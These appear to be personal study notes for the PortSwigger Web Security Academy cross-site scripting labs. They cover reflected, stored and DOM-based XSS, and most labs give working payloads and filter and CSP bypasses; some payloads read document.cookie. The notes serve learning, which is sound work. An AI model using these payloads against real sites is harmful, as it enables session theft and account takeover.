# Reflected XSS

## Lab - 1: Reflected XSS into HTML context with nothing encoded

In search box,

```html
<script>
  alert("1");
</script>
```

---

# Stored XSS

## Lab - 2: Stored XSS into HTML context with nothing encoded

```
POST /post/comment HTTP/1.1
...
Origin: https://0a9c00f604e0a6f0c00e599c007c00b2.web-security-academy.net
Referer: https://0a9c00f604e0a6f0c00e599c007c00b2.web-security-academy.net/post?postId=2
...

csrf=uY2QyKgwlEKbIVZ48E3IhL7SDUKM0yug&postId=2&comment=%3Cscript%3Ealert%282%29%3B%3C%2Fscript%3E&name=Test&email=test%40gmail.com&website=
```

- `<script>alert(2);</script>`

---

# DOM XSS

## Lab - 3: DOM XSS in document.write sink using source location.search

- This lab contains a DOM-based cross-site scripting vulnerability in the search query tracking functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search, which you can control using the website URL.

- The vulnerable JS function used in this lab is

```javascript
function trackSearch(query) {
  document.write(
    '<img src="/resources/images/tracker.gif?searchTerms=' + query + '">'
  );
}
var query = new URLSearchParams(window.location.search).get("search");
if (query) {
  trackSearch(query);
}
```

There are many ways to execute. In search box,

```
"><img src=x onerror=javascript:alert(1) />
```

---

## Lab - 4: DOM XSS in document.write sink using source location.search inside a select element

- This lab contains a DOM-based cross-site scripting vulnerability in the stock checker functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search which you can control using the website URL. The data is enclosed within a select element.

- Vulnerable JS function in this lab is

```javascript
var stores = ["London", "Paris", "Milan"];
var store = new URLSearchParams(window.location.search).get("storeId");
document.write('<select name="storeId">');
if (store) {
  document.write("<option selected>" + store + "</option>");
}
for (var i = 0; i < stores.length; i++) {
  if (stores[i] === store) {
    continue;
  }
  document.write("<option>" + stores[i] + "</option>");
}
document.write("</select>");
```

Test by adding storeId as a new URL parameter and found a new item in drop down

```
GET /product?productId=1&storeId=qwerasdf HTTP/1.1
```

Resulting DOM is as follow.

```html
<select name="storeId">
  <option selected="">qwerasdf</option>
  ...
</select>
```

To exploit,

```
GET /product?productId=1&storeId=</select><script>alert(1);</script> HTTP/1.1
```

---

## Lab - 5: DOM XSS in innerHTML sink using source location.search

- This lab contains a DOM-based cross-site scripting vulnerability in the search blog functionality. It uses an innerHTML assignment, which changes the HTML contents of a div element, using data from location.search.

- Vulnerable JS script for this lab is

```javascript
function doSearchQuery(query) {
  document.getElementById("searchMessage").innerHTML = query;
}
var query = new URLSearchParams(window.location.search).get("search");
if (query) {
  doSearchQuery(query);
}
```

- Many ways to do; In search box,

```html
<img src="x" onerror="alert(1)" />
```

---

## Lab - 6: DOM XSS in jQuery anchor href attribute sink using location.search source

```javascript
$(function () {
  $("#backLink").attr(
    "href",
    new URLSearchParams(window.location.search).get("returnPath")
  );
});
```

```
GET /feedback?returnPath=javascript:alert(document.cookie) HTTP/1.1
```

Then click `back` button.

---

## Lab - 7: DOM XSS in jQuery selector sink using a hashchange event

```javascript
$(window).on("hashchange", function () {
  var post = $(
    "section.blog-list h2:contains(" +
      decodeURIComponent(window.location.hash.slice(1)) +
      ")"
  );
  if (post) post.get(0).scrollIntoView();
});
```

In the exploit server Body,

```html
<iframe
  src="https://0a650071031922c2c01e036400e900df.web-security-academy.net#"
  onload="this.src+='<img src=1 onerror=print(1)>'"
/>
```

---

## Lab - 8: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

- on page source `body` element has `ng-app` attribute.
- In search box, `{{$on.constructor('alert(1)')()}}`

---

## Lab - 9: Reflected DOM XSS

- source js file is at `resources/js/searchResults.js`.
- Vulnerable JS script

```javascript
xhr.onreadystatechange = function () {
  if (this.readyState == 4 && this.status == 200) {
    eval("var searchResultsObj = " + this.responseText);
    displaySearchResults(searchResultsObj);
  }
};
```

In search box, `\"-alert(1)}//`

---

## Lab - 10: Stored DOM XSS

- source js file is at `/resources/js/loadCommentsWithVulnerableEscapeHtml.js`
- Vulnerable JS script

```javascript
function escapeHTML(html) {
  return html.replace("<", "&lt;").replace(">", "&gt;");
}
```

replace() function only replaces the first occurrence.

- In search box, `<><img src=x onerror=alert(1)/>`

---

# XSS Context - between HTML tags

## Lab - 11: Reflected XSS into HTML context with most tags and attributes blocked

- endpoint `https://0a6300f10328845ac050a89a001f0000.web-security-academy.net/?search=` is vulnerable to XSS

- Most tags are blocked
- In intruder, try `<§§>` with all tags from [XSS cheat sheet](!https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- `body` has has 200 response
- Then try `<body%20§§=1>` with all events from XSS cheat sheet
- `onresize` has 200 response
- Add the following in the exploit server body.

```html
<iframe
  src="https://your-lab-id.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E"
  onload="this.style.width"
  ="100px"
></iframe>
```

- %22%3E%3Cbody%20 - `"><body `

---

## Lab - 12: Reflected XSS into HTML context with all tags blocked except custom ones

- In exploit server body,

> not understand

```html
<script>
  location =
    "https://0aeb00b304304397c0de93d700db007f.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x";
</script>
```

- payload - `"><body <xss id=x onfocus=alert(document.cookie) tabindex=1>#x';`

---

## Lab - 13: Reflected XSS with event handlers and href attributes blocked (E)

> not understand

- only `a, image, svg` tags are allowed
- ```
  https://0a3b0070030c4c68c086752d007500a6.web-security-academy.net/?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E
  ```
- payload -

```html
<svg>
  <a>
    <animate attributeName="href" values="javascript:alert(1)" />
    <text x="20" y="20">Click me</text>
  </a>
</svg>
```

---

## Lab - 14: Reflected XSS with some SVG markup allowed

- find with intruder and found that tags - `svg, animateTransform` are allowed and `onbegin` event is also allowed.

```html
<svg><animatetransform onbegin="alert(1)" /></svg>
```

---

# XSS in HTML tag attributes

## Lab - 15: Reflected XSS into attribute with angle brackets HTML-encoded (A)

- input `<img>` returns `&lt;img&gt;` and `<input type=text placeholder='Search the blog...' name=search value="&lt;img&gt;">`

```
" autofocus onfocus=alert(1) x="
```

- will become `<input type="text" placeholder="Search the blog..." name="search" value="" autofocus="" onfocus="alert(1)" x="">`

---

## Lab - 16: Stored XSS into anchor href attribute with double quotes HTML-encoded

- normal return with POST NAME and POST WEBSITE fields

```html
<a id="author" href="POST WEBSITE">POST NAME</a>
```

- post to all field except email with this payload

```html
"/>
<script>
  alert(1);
</script>
```

- results look like

```html
<a id="author" href="">
  <script>
    alert(1);
  </script>
  "NAME</a
>
```

---

## Lab - 17: Reflected XSS in canonical link tag

- This lab reflects user input in a canonical link tag and escapes angle brackets. - To solve the lab, perform a cross-site scripting attack on the home page that injects an attribute that calls the alert function. - To assist with your exploit, you can assume that the simulated user will press the following key combinations:

  - ALT+SHIFT+X - windows
  - CTRL+ALT+X - Mac
  - Alt+X - Linux
    Follow this link on chrome

```
https://your-lab-id.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)

```

- this will result following impact

```html
<link
  rel="canonical"
  href="https://0a32009503386f5ec05733d700f600ef.web-security-academy.net/?"
  accesskey="x"
  onclick="alert(1)"
/>
```

---

# XSS into JS

## Lab - 18: Reflected XSS into a JavaScript string with single quote and backslash escaped (P)

- This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality. The reflection occurs inside a JavaScript string with single quotes and backslashes escaped. To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the alert function.

- in search box, type `qwerasdf` and see the source of the output

```html
<script>
  var searchTerms = 'qwerasdf';
  document.write(...);
</script>
```

- for `';alert(1)`, to escape `'`, but get `var searchTerms = '\';alert(1);';`

- circumvent the whole script by

```html
</script><script>alert(1)</script>
```

---

## Lab - 19: Reflected XSS into a JavaScript string with angle brackets HTML encoded (A)

- This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets are encoded. The reflection occurs inside a JavaScript string. To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the alert function.

- in search box, type `qwerasdf` and see the source of the response

```html
<script>
  var searchTerms = 'qwerasdf';
  document.write(...);
</script>
```

- just circumvent the `'` by adding `'`
- `hi';alert(1);'`

- response looks like

```javascript
var searchTerms = 'hi';alert(1);'';
document.write(...)
```

---

## Lab - 20: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped (P)

- This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets and double are HTML encoded and single quotes are escaped. To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the alert function.

- in search box, type `qwerasdf` and see the source of the response

```html
<script>
  var searchTerms = 'qwerasdf';
  document.write(...);
</script>
```

- try with `';alert(1);'` to bypass the `'` but it was escaped by `/`
- response likes this `var searchTerms = '\';alert(1);'`
- try to bypass the `\` by adding `\`
- `\';alert(1)//` and comment the following

---

## Lab - 21: Reflected XSS in a JavaScript URL with some characters blocked (E)

- This lab reflects your input in a JavaScript URL, but all is not as it seems. This initially seems like a trivial challenge; however, the application is blocking some characters in an attempt to prevent XSS attacks. To solve the lab, perform a cross-site scripting attack that calls the alert function with the string 1337 contained somewhere in the alert message

- `https://0a98002a03f88bf8c0900be1005200de.web-security-academy.net/post?postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27`

- `&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'`

- alert will appear clicking `back to blog` link

- analysis
- Normal link at `back to blog`

```html
<a
  href="javascript:fetch('/analytics', {method:'post',body:'/post%3fpostId%3d3'}).finally(_ => window.location = '/')"
></a>
```

- after exploit,

```html
<a
  href="javascript:fetch('/analytics', {method:'post',body:'/post%3fpostId%3d3%26%27},x%3dx%3d%3e{throw/**/onerror%3dalert,1337},toString%3dx,window%2b%27%27,{x%3a%27'}).finally(_ => window.location = '/')"
></a>
```

URL decode -

```html
<a
  href="javascript:fetch('/analytics', {method:'post',body:'/post?postId=3'}).finally(_ => window.location = '/')"
></a>
```

Vs

```html
<a
  href="javascript:fetch('/analytics', {method:'post',body:'/post?postId=3&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:''}).finally(_ => window.location = '/')"
></a>
```

---

## Lab - 22: Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped (P)

- This lab contains a stored cross-site scripting vulnerability in the comment functionality. To solve this lab, submit a comment that calls the alert function when the comment author name is clicked.

- simple POST requests look like this

```html
<img src="/resources/images/avatarDefault.svg" class="avatar" />
<a
  id="author"
  href="https://abc.com"
  onclick="var tracker={track(){}};tracker.track('https://abc.com');"
  >test1</a
>
13 October 2022
<p>test comment</p>
```

- testing with other fields - comment, name (no XSS is found)
- `'` is also need to bypass as it is reflected as `&apos;`
- `https://abc.com%26apos%3b)-alert(1)//` in the Website input
- response looks like this

```html
<a
  id="author"
  href="https://abc.com')-alert(1)//"
  onclick="var tracker={track(){}};tracker.track('https://abc.com')-alert(1)//');"
  >test1</a
>
```

---

## Lab - 23: Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped (P)

- This lab contains a reflected cross-site scripting vulnerability in the search blog functionality. The reflection occurs inside a template string with angle brackets, single, and double quotes HTML encoded, and backticks escaped. To solve this lab, perform a cross-site scripting attack that calls the alert function inside the template string.

- test with random string and the response looks like

```html
<script>
  var message = `0 search results for 'qwerasdf'`;
  document.getElementById("searchMessage").innerText = message;
</script>
```

- inside the backtick
- just follow this syntax to execute JS `${alert(1)}`

---

## Lab - 24: Reflected XSS protected by very strict CSP, with dangling markup attack (E)

- This lab using a strict CSP that blocks outgoing requests to external web sites. To solve the lab, first perform a cross-site scripting attack that bypasses the CSP and exfiltrates a simulated victim user's CSRF token using Burp Collaborator. You then need to change the simulated user's email address to hacker@evil-user.net. You must label your vector with the word "Click" in order to induce the simulated user to click it. For example: `<a href="">Click me</a>`
  You can log in to your own account using the following credentials: wiener:peter
